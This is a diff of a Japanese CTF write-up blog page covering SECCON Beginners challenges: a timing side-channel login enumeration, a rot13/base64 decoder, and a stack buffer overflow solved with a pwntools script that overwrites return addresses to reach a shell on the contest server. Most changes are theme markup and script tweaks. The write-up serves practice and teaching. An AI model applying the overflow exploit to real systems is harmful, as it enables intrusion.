-            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="s2">&#34;Login failed, try again.&#34;</span><span class="p">,</span> <span class="n">sec</span><span class="o">=</span><span class="s2">&#34;{:.7f}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">perf_counter</span><span class="p">()</span><span class="o">-</span><span class="n">t</span><span class="p">))</span>
+            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">,</span> <span class="n">message</span><span class="o">=</span><span class="s2">&#34;Login failed, try again.&#34;</span><span class="p">,</span> <span class="n">sec</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">{:.7f}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">perf_counter</span><span class="p">()</span><span class="o">-</span><span class="n">t</span><span class="p">))</span>
 
         <span class="n">session</span><span class="p">[</span><span class="s2">&#34;name&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">name</span>
-        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;dashboard.html&#34;</span><span class="p">,</span> <span class="n">sec</span><span class="o">=</span><span class="s2">&#34;{:.7f}&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">perf_counter</span><span class="p">()</span><span class="o">-</span><span class="n">t</span><span class="p">))</span>
+        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;dashboard.html&#34;</span><span class="p">,</span> <span class="n">sec</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">{:.7f}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">perf_counter</span><span class="p">()</span><span class="o">-</span><span class="n">t</span><span class="p">))</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>どうやら最初に名前がDBにあるか確認し、無かったらメッセージを返してあったらハッシュを計算という感じ。<br />
@@ -1841,14 +1961,14 @@ gdb-pedaで内容をざっと見しながらデバックしてみる。<br />
 取り敢えず、DBにデータが無かったらすぐにindex.htmlを返すので処理時間に差が出るかもと思い計測してみる。<br />
 本来なら計測用のコードがここで出てくるはずだが、自分は面倒だったので気合で人力計測してしまった。（ワンライナーは得意なんだからこういうところで役立てたらいいのに）<br />
 見事にビンゴ。flagは、</p>
-<pre><code>ctf4b{4cc0un7_3num3r4710n_by_51d3_ch4nn3l_4774ck}
+<pre tabindex="0"><code>ctf4b{4cc0un7_3num3r4710n_by_51d3_ch4nn3l_4774ck}
 </code></pre><h2 id="crypt-rb">[Crypt] R&amp;B</h2>
 <p>フラグをあるプログラムでエンコードしたから、それを復元してねという問題。<br />
 エンコードされたフラグとプログラムは以下。</p>
-<pre><code>BQlVrOUllRGxXY2xGNVJuQjRkVFZ5U0VVMGNVZEpiRVpTZVZadmQwOWhTVEIxTkhKTFNWSkdWRUZIUlRGWFUwRklUVlpJTVhGc1NFaDFaVVY1Ukd0Rk1qbDFSM3BuVjFwNGVXVkdWWEZYU0RCTldFZ3dRVmR5VVZOTGNGSjFTMjR6VjBWSE1rMVRXak5KV1hCTGVYZEplR3BzY0VsamJFaGhlV0pGUjFOUFNEQk5Wa1pIVFZaYVVqRm9TbUZqWVhKU2NVaElNM0ZTY25kSU1VWlJUMkZJVWsxV1NESjFhVnBVY0d0R1NIVXhUVEJ4TmsweFYyeEdNVUUxUlRCNVIwa3djVmRNYlVGclJUQXhURVZIVGpWR1ZVOVpja2x4UVZwVVFURkZVblZYYmxOaWFrRktTVlJJWVhsTFJFbFhRVUY0UlZkSk1YRlRiMGcwTlE9PQ==
+<pre tabindex="0"><code>BQlVrOUllRGxXY2xGNVJuQjRkVFZ5U0VVMGNVZEpiRVpTZVZadmQwOWhTVEIxTkhKTFNWSkdWRUZIUlRGWFUwRklUVlpJTVhGc1NFaDFaVVY1Ukd0Rk1qbDFSM3BuVjFwNGVXVkdWWEZYU0RCTldFZ3dRVmR5VVZOTGNGSjFTMjR6VjBWSE1rMVRXak5KV1hCTGVYZEplR3BzY0VsamJFaGhlV0pGUjFOUFNEQk5Wa1pIVFZaYVVqRm9TbUZqWVhKU2NVaElNM0ZTY25kSU1VWlJUMkZJVWsxV1NESjFhVnBVY0d0R1NIVXhUVEJ4TmsweFYyeEdNVUUxUlRCNVIwa3djVmRNYlVGclJUQXhURVZIVGpWR1ZVOVpja2x4UVZwVVFURkZVblZYYmxOaWFrRktTVlJJWVhsTFJFbFhRVUY0UlZkSk1YRlRiMGcwTlE9PQ==
 </code></pre><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1866,7 +1986,7 @@ gdb-pedaで内容をざっと見しながらデバックしてみる。<br />
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">FLAG</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;FLAG&#34;</span><span class="p">)</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">FLAG</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;FLAG&#34;</span><span class="p">)</span>
 <span class="n">FORMAT</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;FORMAT&#34;</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">rot13_encode</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
@@ -1881,7 +2001,7 @@ gdb-pedaで内容をざっと見しながらデバックしてみる。<br />
     <span class="k">if</span> <span class="n">t</span> <span class="o">==</span> <span class="s2">&#34;B&#34;</span><span class="p">:</span>
         <span class="n">FLAG</span> <span class="o">=</span> <span class="s2">&#34;B&#34;</span> <span class="o">+</span> <span class="n">base64_encode</span><span class="p">(</span><span class="n">FLAG</span><span class="p">)</span>
 
-<span class="k">print</span><span class="p">(</span><span class="n">FLAG</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">FLAG</span><span class="p">)</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>コメントの部分は推測するために自分で付け足した。（元々は無い）<br />
@@ -1890,7 +2010,7 @@ gdb-pedaで内容をざっと見しながらデバックしてみる。<br />
 ソルバは以下。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1917,7 +2037,7 @@ gdb-pedaで内容をざっと見しながらデバックしてみる。<br />
 </span><span class="lnt">25
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">getenv</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">getenv</span>
 <span class="kn">import</span> <span class="nn">base64</span>
 <span class="kn">import</span> <span class="nn">codecs</span>
 
@@ -1939,15 +2059,15 @@ gdb-pedaで内容をざっと見しながらデバックしてみる。<br />
         <span class="n">flag</span><span class="o">=</span><span class="n">flag</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
         <span class="n">flag</span> <span class="o">=</span> <span class="n">base64_decode</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
 
-    <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
 
-<span class="k">print</span><span class="p">(</span><span class="s2">&#34;result:&#34;</span><span class="p">,</span><span class="n">flag</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&#34;result:&#34;</span><span class="p">,</span><span class="n">flag</span><span class="p">)</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>ループ回数は適当。<br />
 単純に与えられたコードの逆の処理を書いていくことで求まる。<br />
 結果は以下。</p>
-<pre><code>BUk9IeDlWclF5RnB4dTVySEU0cUdJbEZSeVZvd09hSTB1NHJLSVJGVEFHRTFXU0FITVZIMXFsSEh1ZUV5RGtFMjl1R3pnV1p4eWVGVXFXSDBNWEgwQVdyUVNLcFJ1S24zV0VHMk1TWjNJWXBLeXdJeGpscEljbEhheWJFR1NPSDBNVkZHTVZaUjFoSmFjYXJScUhIM3FScndIMUZRT2FIUk1WSDJ1aVpUcGtGSHUxTTBxNk0xV2xGMUE1RTB5R0kwcVdMbUFrRTAxTEVHTjVGVU9ZcklxQVpUQTFFUnVXblNiakFKSVRIYXlLRElXQUF4RVdJMXFTb0g0NQ==
+<pre tabindex="0"><code>BUk9IeDlWclF5RnB4dTVySEU0cUdJbEZSeVZvd09hSTB1NHJLSVJGVEFHRTFXU0FITVZIMXFsSEh1ZUV5RGtFMjl1R3pnV1p4eWVGVXFXSDBNWEgwQVdyUVNLcFJ1S24zV0VHMk1TWjNJWXBLeXdJeGpscEljbEhheWJFR1NPSDBNVkZHTVZaUjFoSmFjYXJScUhIM3FScndIMUZRT2FIUk1WSDJ1aVpUcGtGSHUxTTBxNk0xV2xGMUE1RTB5R0kwcVdMbUFrRTAxTEVHTjVGVU9ZcklxQVpUQTFFUnVXblNiakFKSVRIYXlLRElXQUF4RVdJMXFTb0g0NQ==
 ROHx9VrQyFpxu5rHE4qGIlFRyVowOaI0u4rKIRFTAGE1WSAHMVH1qlHHueEyDkE29uGzgWZxyeFUqWH0MXH0AWrQSKpRuKn3WEG2MSZ3IYpKywIxjlpIclHaybEGSOH0MVFGMVZR1hJacarRqHH3qRrwH1FQOaHRMVH2uiZTpkFHu1M0q6M1WlF1A5E0yGI0qWLmAkE01LEGN5FUOYrIqAZTA1ERuWnSbjAJITHayKDIWAAxEWI1qSoH45
 ROHx9RrHyyDxu5rHIHn0gWHxyuDHcSGRE5FHSWrQHkFT1GoaNkI2IkHwISFJSCIx1WpHWkrQOfE3uKqycVL2qZrRyhE1ASFHI6H0MnZzgxGTSwDz55H0gPFHSho0g1IHugGzgRrKSyGISWGIc3qGMXE09HpKyWM0cuDHIhZ05eFRyWARM6DIWWEmN9
 RODyIeBHyyETkKIRIaAJELDyIAIx51HmSnp1WeqR5EIaOVMIqBqx0lGxWvZHcgLxInGSEIEzSFZ2kdLacBnySKBIAnoKuUHmNkDyqeMQIMZwu6JGOTqyIgJaAEn3NkHII4FzARIG0=
@@ -1967,7 +2087,7 @@ result: ctf4b{rot_base_rot_base_rot_base_base}
 内容は一緒。多分サーバに負荷がかからないような配慮だと思う。<br />
 実行ファイルを実行すると、スタックが図示され入力を求められる。<br />
 とりあえず0をいっぱい入力してみる。</p>
-<pre><code>Your goal is to call `win` function (located at 0x400861)
+<pre tabindex="0"><code>Your goal is to call `win` function (located at 0x400861)
 
    [ Address ]           [ Stack ]
                    +--------------------+
@@ -2024,7 +2144,7 @@ Input: 000000000000000000000000000000000
 これならバイナリデータをそのままぶちこむことができる。<br />
 最初から最後まで自動化できるしなるほどこれは便利。</p>
 <p>こうしてreturn addressだけを書き換えることはできた。</p>
-<pre><code>                   +--------------------+
+<pre tabindex="0"><code>                   +--------------------+
 0x00007ffeed69c960 | 0x00007ffeed69c970 | &lt;-- saved rbp (vuln)
                    +--------------------+
 0x00007ffeed69c968 | 0x0000000000400861 | &lt;-- return address (vuln)
@@ -2034,7 +2154,7 @@ Input: 000000000000000000000000000000000
 0x00007ffeed69c978 | 0x00007fee2cb27b97 | &lt;-- return address (main)
                    +--------------------+
 </code></pre><p>これでOKや！！！的なことを考えていたらこんなメッセージが出てきた。</p>
-<pre><code>Oops! RSP is misaligned!
+<pre tabindex="0"><code>Oops! RSP is misaligned!
 Some functions such as `system` use `movaps` instructions in libc-2.27 and later.
 This instruction fails when RSP is not a multiple of 0x10.
 Find a way to align RSP! You're almost there!
@@ -2056,7 +2176,7 @@ vulnとmainそれぞれにrbpとrspの値があったのでどっちも使うん
 粘った証をここに残しておく。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2154,7 +2274,7 @@ vulnとmainそれぞれにrbpとrspの値があったのでどっちも使うん
 </span><span class="lnt">96
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">buf</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
 <span class="n">send_data</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
@@ -2201,10 +2321,10 @@ vulnとmainそれぞれにrbpとrspの値があったのでどっちも使うん
 <span class="n">ret_main</span><span class="o">=</span><span class="n">buf</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
 <span class="n">ret_main</span><span class="o">=</span><span class="n">ret_main</span><span class="p">[</span><span class="mi">23</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span>
 
-<span class="k">print</span><span class="p">(</span><span class="n">saved_vuln</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">ret_vuln</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">saved_main</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">ret_main</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">saved_vuln</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">ret_vuln</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">saved_main</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">ret_main</span><span class="p">)</span>
 
 <span class="c1"># padding</span>
 <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="mi">4</span><span class="p">):</span>
@@ -2248,8 +2368,8 @@ vulnとmainそれぞれにrbpとrspの値があったのでどっちも使うん
 <span class="n">result</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
 <span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-<span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
-<span class="k">print</span><span class="p">(</span><span class="n">send_data</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">send_data</span><span class="p">)</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>色んなところのアドレスを書き換えられるようにして色々試してみたが結局ダメだった。<br />
@@ -2264,7 +2384,7 @@ vulnのreturn addressをvulnのret命令に持ってきてmainのrbpをwinの関
 変更したコードは以下の通り。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2362,7 +2482,7 @@ vulnのreturn addressをvulnのret命令に持ってきてmainのrbpをwinの関
 </span><span class="lnt">96
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="n">buf</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
 <span class="n">send_data</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
@@ -2409,10 +2529,10 @@ vulnのreturn addressをvulnのret命令に持ってきてmainのrbpをwinの関
 <span class="n">ret_main</span><span class="o">=</span><span class="n">buf</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
 <span class="n">ret_main</span><span class="o">=</span><span class="n">ret_main</span><span class="p">[</span><span class="mi">23</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span>
 
-<span class="k">print</span><span class="p">(</span><span class="n">saved_vuln</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">ret_vuln</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">saved_main</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">ret_main</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">saved_vuln</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">ret_vuln</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">saved_main</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">ret_main</span><span class="p">)</span>
 
 <span class="c1"># padding</span>
 <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="mi">4</span><span class="p">):</span>
@@ -2456,13 +2576,13 @@ vulnのreturn addressをvulnのret命令に持ってきてmainのrbpをwinの関
 <span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 <span class="n">result</span><span class="o">=</span><span class="n">conn</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
 <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-<span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
-<span class="k">print</span><span class="p">(</span><span class="n">send_data</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">send_data</span><span class="p">)</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>あぁスッキリした。<br />
 この後はシェルに入れるので、</p>
-<pre><code>[+] Opening connection to bs.quals.beginners.seccon.jp on port 9001: Done
+<pre tabindex="0"><code>[+] Opening connection to bs.quals.beginners.seccon.jp on port 9001: Done
 00007ffed9108c60
 000000000040084e
 0000000000400ad0
@@ -2514,6 +2634,119 @@ ctf4b{u_r_st4ck_pwn_b3g1nn3r_tada}
 
     </article>
     
+    
+<script defer src="/blog/js/clipboard.min.1626706afc88d95ebe1173b553ec732c6dc82a576989315fdf5e7779af738a44.js"></script>
+
+<script defer src="/blog/js/helper/prev.min.js"></script>
+
+<script defer src="/blog/js/helper/prop.min.js"></script>
+<script>
+  'use strict';
+  document.addEventListener('DOMContentLoaded', function () {
+    
+    var clipInit = false;
+    var preChromaElem = document.querySelectorAll('pre.chroma');
+    var langCodeElem = document.querySelectorAll('.language-code');
+    var dollarCodeElem = document.querySelectorAll('div.language-\\$');
+    var gtCodeElem = document.querySelectorAll('div.language-\\>');
+
+    var makeClipboard = function(elem) {
+      var code = elem,
+          text = elem.textContent;
+        
+      if (text.length > 15) {
+        if (!clipInit) {
+          var text, clip = new ClipboardJS('.copy-to-clipboard', {
+            text: function (trigger) {
+              var codeElem = prev(trigger).querySelectorAll('code');
+              if (codeElem.length > 1) {
+                text = prev(trigger).querySelector('code[class^="language-"]').textContent;
+              } else {
+                text = prev(trigger).querySelector('code').textContent;
+              }
+
+              return text.replace(/^\$\s/gm, '');
+            }
+          });
+
+          var inPre;
+          clip.on('success', function (e) {
+            e.clearSelection();
+            inPre = prop(e.trigger.parentNode, 'tagName') == 'PRE';
+            e.trigger.setAttribute('aria-label', 'Copied to clipboard!');
+            e.trigger.classList.add('tooltipped');
+            e.trigger.classList.add('tooltipped-w');
+          });
+
+          clip.on('error', function (e) {
+            inPre = prop(e.trigger.parentNode, 'tagName') == 'PRE';
+            e.trigger.setAttribute('aria-label', e.action.toString());
+            e.trigger.classList.add('tooltipped');
+            e.trigger.classList.add('tooltipped-w');
+          });
+
+          clipInit = true;
+        }
+
+        var notAllowedClass = ['language-mermaid', 'language-viz', 'language-wave', 'language-chart', 'language-msc', 'language-flowchart'];
+        var isNotAllowedIncluded = false;
+        var curClassName = code.getAttribute('class');
+
+        for (var i = 0; i < notAllowedClass.length; i++) {
+          if (curClassName && curClassName.startsWith(notAllowedClass[i])) {
+            isNotAllowedIncluded = true;
+            break;
+          }
+        }
+
+        if (!isNotAllowedIncluded) {
+          if (curClassName) {
+            var newClipboardElem = document.createElement('span');
+            newClipboardElem.setAttribute('class', 'copy-to-clipboard');
+            newClipboardElem.setAttribute('title', 'Copy to clipboard');
+            elem.parentNode.parentNode.insertBefore(newClipboardElem, elem.parentNode.nextElementSibling);
+          }
+        }
+      }
+    }
+
+    var makeSymbolClipboard = function(elem) {
+      var clipboardSpan = document.createElement('span');
+      clipboardSpan.setAttribute('class', 'copy-to-clipboard');
+      clipboardSpan.setAttribute('title', 'Copy to clipboard');
+      elem.parentNode.parentNode.insertBefore(clipboardSpan, elem.parentNode.nextElementSibling);
+    }
+
+    preChromaElem ? 
+    preChromaElem.forEach(function(elem) {
+      elem.querySelectorAll('code').forEach(function(codeElem) {
+        makeClipboard(codeElem);
+      });
+    }) : null;
+    
+    langCodeElem ? 
+    langCodeElem.forEach(function(elem) {
+      elem.querySelectorAll('code').forEach(function (codeElem) {
+        makeClipboard(codeElem);
+      });
+    }) : null;
+
+    dollarCodeElem ? 
+    dollarCodeElem.forEach(function(elem) {
+      elem.querySelectorAll('code').forEach(function (codeElem) {
+        makeSymbolClipboard(codeElem);
+      });
+    }) : null;
+
+    gtCodeElem ?
+    gtCodeElem.forEach(function(elem) {
+      elem.querySelectorAll('code').forEach(function (codeElem) {
+        makeSymbolClipboard(codeElem);
+      });
+    }) : null;
+    
+  });
+</script>
     <script>
   'use strict';
   
@@ -2561,6 +2794,31 @@ ctf4b{u_r_st4ck_pwn_b3g1nn3r_tada}
     elem.append(newElem);
   }) : null;
   
+
+  
+
+  
+  var dollarCodeElem = document.querySelectorAll('div.language-\\$');
+  var gtCodeElem = document.querySelectorAll('div.language-\\>');
+
+  dollarCodeElem ?
+  dollarCodeElem.forEach(function(elem) {
+    var lnts = elem.parentNode.parentNode ? elem.parentNode.parentNode.querySelectorAll('.lnt') : null;
+    lnts ? 
+    lnts.forEach(function(lnt) {
+      lnt.innerHTML = '$<br/>';
+    }) : null;
+  }) : null;
+
+  gtCodeElem ?
+  gtCodeElem.forEach(function(elem) {
+    var lnts = elem.parentNode.parentNode ? elem.parentNode.parentNode.querySelectorAll('.lnt') : null;
+    lnts ? 
+    lnts.forEach(function(lnt) {
+      lnt.innerHTML = '><br/>';
+    }) : null;
+  }) : null;
+  
 </script>
     
 <div class="donation">
@@ -2585,6 +2843,7 @@ ctf4b{u_r_st4ck_pwn_b3g1nn3r_tada}
     
   </div>
 </div>
+
 
     
     
@@ -2743,6 +3002,13 @@ ctf4b{u_r_st4ck_pwn_b3g1nn3r_tada}
     
     <div class="grow"></div>
     
+      <a href="https://Alignof.github.io/blog/posts/seccamp/" class="pagination-single__right">      
+        <div class="pagination-single__right-title">セキュリティ・キャンプ全国大会2020に参加してきた&lt;1&gt;</div>
+        <div class="pagination-single__icon">
+          <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"/></svg>
+        </div>
+      </a>
+    
   
 </nav>
     
@@ -2795,7 +3061,7 @@ ctf4b{u_r_st4ck_pwn_b3g1nn3r_tada}
 </div>
 
 
-<script defer src="/blog/js/swipe.min.08ff2be1b74347bad9e267f732f1388d271b2f9d97b6a8a87bd6a510f17c5ad2.js"></script>
+<script defer src="/blog/js/swipe.min.989e074dfb92ce7f57a92c1df7027f88b53c50a54fd9ad450a673a64aa91bfa4.js"></script>
 
 <script defer src="/blog/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -3185,7 +3451,6 @@ document.addEventListener('DOMContentLoaded', function () {
 
 
 
-<script defer src="/blog/js/clipboard.min.1626706afc88d95ebe1173b553ec732c6dc82a576989315fdf5e7779af738a44.js"></script>
 
 <script defer src="/blog/js/helper/getParents.min.js"></script>
 
@@ -3196,6 +3461,42 @@ document.addEventListener('DOMContentLoaded', function () {
 <script defer src="/blog/js/helper/prop.min.js"></script>
 
 <script defer src="/blog/js/helper/fadeinout.min.js"></script>
+
+<script defer src="/blog/js/helper/throttle.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -3233,6 +3534,7 @@ document.addEventListener('DOMContentLoaded', function () {
     
 
 
+
     
     
     
@@ -3248,6 +3550,18 @@ document.addEventListener('DOMContentLoaded', function () {
     
     if ((enableToc || toc) && document.querySelector('.toc')) {
       var tableOfContentsElem = document.querySelector('.toc').querySelector('#TableOfContents');
+
+      tableOfContentsElem.onmouseenter = function() {
+        if (navbar.classList.contains('scrolling')) {
+          navbar.classList.remove('scrolling');
+        }
+      }
+
+      tableOfContentsElem.onmouseleave = function() {
+        if (!navbar.classList.contains('scrolling')) {
+          navbar.classList.add('scrolling');
+        }
+      }
 
       if (false === tocFolding) {
 
@@ -3267,10 +3581,13 @@ document.addEventListener('DOMContentLoaded', function () {
           tableOfContentsElem.querySelectorAll('a').forEach(function (elem) {
             elem.addEventListener('click', function () {
               var id = elem.getAttribute('id');
-              navbar.classList.remove('navbar--show');
-              navbar.classList.remove('navbar--hide');
-              navbar.classList.add('navbar--hide');
 
+              if (!navbar.classList.contains('scrolling')) {
+                navbar.classList.remove('navbar--show');
+                navbar.classList.remove('navbar--hide');
+                navbar.classList.add('navbar--hide');
+              }
+              
               document.querySelector('.toc').querySelectorAll('a').forEach(function (elem) {
                 elem.classList.remove('active');
               });
@@ -3363,18 +3680,24 @@ document.addEventListener('DOMContentLoaded', function () {
       }) : null;
     }
     
-
-
     
-    var tables = document.querySelectorAll('.single__contents > table');
-    for (let i = 0; i < tables.length; i++) {
-      var table = tables[i];
-      var wrapper = document.createElement('div');
-      wrapper.className = 'table-wrapper';
-      table.parentElement.replaceChild(wrapper, table);
-      wrapper.appendChild(table);
+    
+    
+    
+    var topOffset = 120;
+    var botOffset = 70;
+    var handleWindowResize = function () {
+      if (tocElem) {
+        tocElem.style.maxHeight = (window.innerHeight - topOffset - botOffset) + 'px';
+      }
     }
+    var throttledWindowResize = throttle(handleWindowResize, 300);
+    throttledWindowResize()
+
     
+    window.addEventListener('resize', throttledWindowResize);
+    
+
 
 
     
@@ -3386,20 +3709,22 @@ document.addEventListener('DOMContentLoaded', function () {
 
     headers ? 
     headers.forEach(function (elem) {
+      var size = parseInt(elem.tagName.substr(1), 10) * 2;
       var url = encodeURI(document.location.origin + document.location.pathname);
       var link = url + "#" + elem.getAttribute('id');
       var newElemOuter = document.createElement('span');
       newElemOuter.classList.add('anchor');
       newElemOuter.classList.add('hide');
-      newElemOuter.setAttribute('data-clipboard-text', link);
+      newElemOuter.setAttribute('data-clipboard-text', decodeURI(link));
       newElemOuter.style.position = 'relative';
 
       var newElemInner = document.createElement('span');
-      newElemInner.style.fontSize = '1rem';
       newElemInner.style.position = 'absolute';
       newElemInner.style.top = '50%';
+      newElemInner.style.left = '0.75rem';
       newElemInner.style.transform = 'translateY(-50%)';
-      newElemInner.innerText = "🔗";
+      newElemInner.innerHTML = `
